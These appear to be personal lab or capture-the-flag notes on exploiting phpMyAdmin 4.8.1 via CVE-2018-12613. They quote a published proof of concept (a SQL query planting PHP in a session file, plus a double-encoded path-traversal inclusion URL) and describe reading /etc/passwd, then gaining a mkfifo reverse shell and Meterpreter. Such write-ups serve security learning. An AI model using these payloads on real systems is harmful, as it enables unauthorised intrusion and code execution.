![[Pasted image 20230504022927.png]]
```
# Exploit Title: phpMyAdmin 4.8.1 - Local File Inclusion to Remote Code Execution  
# Date: 2018-06-21  
# Exploit Author: VulnSpy  
# Vendor Homepage: http://www.phpmyadmin.net  
# Software Link: https://github.com/phpmyadmin/phpmyadmin/archive/RELEASE_4_8_1.tar.gz  
# Version: 4.8.0, 4.8.1  
# Tested on: php7 mysql5  
# CVE : CVE-2018-12613  
  
1. Run SQL Query : select '<?php phpinfo();exit;?>'  
2. Include the session file :  
http://1a23009a9c9e959d9c70932bb9f634eb.vsplate.me/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_11njnj4253qq93vjm9q93nvc7p2lq82k
```

This isn't very descriptive so I just tried looking at other things.

## /etc/passwd
![[Pasted image 20230504023951.png]]
With LFI confirmed, there is this script that will take my cookie and a token and authenticate to the server. It will then execute a PHP system command to execute arbitrary commands:
https://www.exploit-db.com/exploits/50457. This is similar to the shitty exploit (un)description as above.

![[Pasted image 20230504025827.png]]

A reverse shell does reach out, however it seems to crash immediately.
![[Pasted image 20230504025950.png]]

Using a mkfifo shell worked, then setting up meterpreter for stability.
